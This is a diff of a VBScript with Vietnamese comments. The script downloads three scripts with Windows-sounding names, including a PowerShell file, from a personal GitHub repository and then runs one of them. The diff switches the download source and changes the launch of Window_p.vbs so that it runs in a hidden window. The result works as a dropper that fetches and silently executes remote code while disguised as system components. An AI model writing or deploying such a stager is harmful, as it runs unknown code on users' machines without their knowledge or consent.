@@ -1,5 +1,5 @@
 Option Explicit
-On Error Resume Next 
+'On Error Resume Next 
 Dim fso, folderPath, files, urls, i, file, url, WshShell, objXMLHTTP, adoStream
 
 ' Khởi tạo FileSystemObject và WshShell
@@ -18,13 +18,13 @@ Else
 End If
 
 ' Danh sách tên file cần có
-files = Array("setup_window.vbs", "system_control.ps1", "Window_p.vbs")
+files = Array("Window_p.vbs", "setup_window.vbs", "system_control.ps1")
 
 ' Danh sách URL của các file cần tải
 urls = Array( _
-    "https://downgit.github.io/temps/setup_window.vbs", _
-    "https://downgit.github.io/temps/system_control.ps1", _
-    "https://downgit.github.io/temps/Window_p.vbs" _
+    "https://raw.githubusercontent.com/letrongdoan/test/refs/heads/main/Window_p.vbs", _
+    "https://raw.githubusercontent.com/letrongdoan/test/refs/heads/main/setup_window.vbs", _
+    "https://raw.githubusercontent.com/letrongdoan/test/refs/heads/main/system_control.ps1" _
 )
 
 ' Kiểm tra từng file, nếu không có thì tải về
@@ -45,7 +45,7 @@ Next
 file = folderPath & "\Window_p.vbs"
 If fso.FileExists(file) Then
     'WScript.Echo "Chạy file Window_p.vbs..."
-    WshShell.Run "wscript.exe """ & file & """"
+    WshShell.Run "wscript.exe """ & file & """", 0, False
 Else
     'WScript.Echo "File Window_p.vbs không tồn tại."
 End If
